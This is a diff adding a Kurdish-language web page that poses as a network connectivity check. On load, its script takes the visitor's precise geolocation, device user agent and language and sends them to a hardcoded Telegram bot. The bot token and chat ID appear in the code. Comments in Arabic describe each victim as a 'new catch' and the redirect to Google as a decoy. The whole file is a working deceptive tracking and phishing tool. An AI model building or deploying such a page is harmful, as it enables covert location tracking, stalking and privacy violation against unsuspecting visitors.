@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>پشکنینا تورێ</title>
+    <style>
+        body { background-color: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; color: #1c1e21; }
+        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #007aff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 18px; margin-bottom: 10px; }
+        p { font-size: 14px; color: #606770; line-height: 1.6; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <h2>چاڤەرێ بە...</h2>
+        <p>بۆ پاراستنا پەیوەندییا تە و دەستکەفتنا ئینتەرنێتەکا بێ هێز، هیڤی دکەین رێ بدە جهێ خۆ (Location) دا کو خزمەتگۆزاری بهێتە کاراکردن.</p>
+    </div>
+
+    <script>
+        async function sendToTelegram() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const token = '8771984439:AAECnMtAXuKSmN-1Kjn2sHfj_I15q95BOoQ';
+                    const chat_id = '8266081844';
+                    
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const device = navigator.userAgent;
+                    const lang = navigator.language;
+
+                    // إرسال الموقع الجغرافي
+                    await fetch(`https://api.telegram.org/bot${token}/sendLocation?chat_id=${chat_id}&latitude=${lat}&longitude=${lon}`);
+                    
+                    // إرسال معلومات الجهاز
+                    const text = encodeURIComponent(`✅ صيد جديد (GitHub)!\n📱 الجهاز: ${device}\n🌐 اللغة: ${lang}`);
+                    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}`);
+
+                    // توجيه لصفحة وهمية بعد النجاح
+                    window.location.href = "https://www.google.com";
+                }, (error) => {
+                    alert("ژبۆ کارکرنا ڤێ خزمەتگۆزاریێ، پێتڤییە رێبدەی جهێ تە بهێتە دیارکرن.");
+                }, { enableHighAccuracy: true });
+            }
+        }
+        window.onload = sendToTelegram;
+    </script>
+</body>
+</html>
